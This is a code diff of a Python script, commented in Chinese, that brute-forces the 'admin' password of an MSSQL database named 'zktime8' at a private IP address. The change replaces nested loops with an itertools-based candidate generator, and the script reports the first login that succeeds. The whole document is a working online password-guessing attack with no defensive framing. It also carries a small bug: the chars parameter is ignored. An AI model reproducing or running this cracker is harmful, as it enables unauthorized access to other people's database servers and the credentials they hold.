@@ -66,28 +66,35 @@ class MSSQL:
         self.conn.close()
 
 
-def main():
-    # 密码字符集
-    charset = string.printable[:-64]
-    # 5位密码
+def crack_dict(max, min=1, chars=None):
+    assert max >= min >= 1
+
+    if chars is None:
+        import string
+        chars = string.printable[:-5]  # -38:数字+大小写字母，-64：数字+小写字母，-90：数字
+
+    p = []
+    for i in range(min, max + 1):
+        p.append(itertools.product(string.printable[:-5], repeat=i))
+
+    return itertools.chain(*p)
+
+
+def main(n):
+    password = crack_dict(n)
     i = 0
-    for ch1 in range(len(charset)):
-        for ch2 in range(len(charset)):
-            for ch3 in range(len(charset)):
-                for ch4 in range(len(charset)):
-                    password = str(charset[ch1]) + str(charset[ch2]) + str(
-                        charset[ch3]) + str(charset[ch4])
-                    i += 1
-                    if i >= 0:  # 断点
-                        try:
-                            ms = MSSQL(host="192.168.2.228", user="admin", pwd=password,
-                                       db="zktime8")
-                            query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
-                            print('Success!', password, ';', query)
-                            input('Wait........')
-                        except Exception as e:
-                            print('id:', i, '，try:', password, e)
+    for j in password:
+        i += 1
+        if i >= 0:  # 断点
+            try:
+                ms = MSSQL(host="192.168.2.228", user="admin", pwd=''.join(tuple(j)),
+                           db="zktime8")
+                query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
+                print('Success!', j, ';', query)
+                input('Wait........')
+            except Exception as e:
+                print('id:', i, '，try:', ''.join(tuple(j)), e)
 
 
 if __name__ == '__main__':
-    main()
+    main(2)  # 密码长度
